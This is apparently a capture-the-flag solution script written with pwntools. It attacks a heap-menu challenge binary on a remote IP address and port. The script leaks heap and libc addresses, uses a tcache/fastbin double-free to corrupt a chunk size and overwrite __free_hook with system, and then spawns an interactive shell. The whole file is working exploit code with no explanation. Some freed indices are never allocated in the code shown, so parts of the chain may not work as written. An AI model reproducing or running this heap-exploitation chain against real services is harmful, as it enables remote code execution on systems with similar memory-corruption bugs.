from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

io = remote('152.118.201.241', 3025)

def add(idx, title, page):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.sendlineafter(b'Title: ', title)
    io.sendlineafter(b'Page: ', str(page).encode())

def read(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.recvuntil(b'Title: ')
    return io.recvline().strip()

def remove(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'?: ', str(idx).encode())

# =====================
# STEP 1: Leak heap
# =====================
add(0, b'A', 1)
add(1, b'B', 1)

remove(0)
remove(1)

leak = u64(read(1).ljust(8, b'\x00'))
heap_base = leak & ~0xfff   # safer approximation

log.success(f"Heap leak: {hex(leak)}")
log.success(f"Heap base: {hex(heap_base)}")

# =====================
# STEP 2: Fastbin dup
# =====================
for i in range(2, 9):
    add(i, b'C', 1)

for i in range(2, 9):
    remove(i)

remove(9)
remove(10)
remove(9)

# empty tcache
for i in range(2, 9):
    add(i, b'D', 1)

# =====================
# STEP 3: overwrite chunk size
# =====================
stride = 0x30

chunk0 = leak
target_chunk = chunk0 + (12 * stride)
target_header = target_chunk - 0x10

add(9, p64(target_header), 1)
add(10, b'E', 1)
add(11, b'F', 1)

add(13, b'A'*8 + p64(0x421), 1)

# =====================
# STEP 4: libc leak
# =====================
remove(12)

libc_leak = u64(read(12).ljust(8, b'\x00'))
libc_base = libc_leak - 0x3ebca0

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

log.success(f"Libc base: {hex(libc_base)}")

# =====================
# STEP 5: overwrite __free_hook
# =====================
for i in range(2, 9):
    remove(i)

remove(20)
remove(21)
remove(20)

for i in range(2, 9):
    add(i, b'G', 1)

add(20, p64(free_hook), 1)
add(21, b'H', 1)
add(22, b'I', 1)

add(23, p64(system), 1)

# =====================
# STEP 6: trigger
# =====================
add(0, b'/bin/sh\x00', 1)
remove(0)

io.interactive()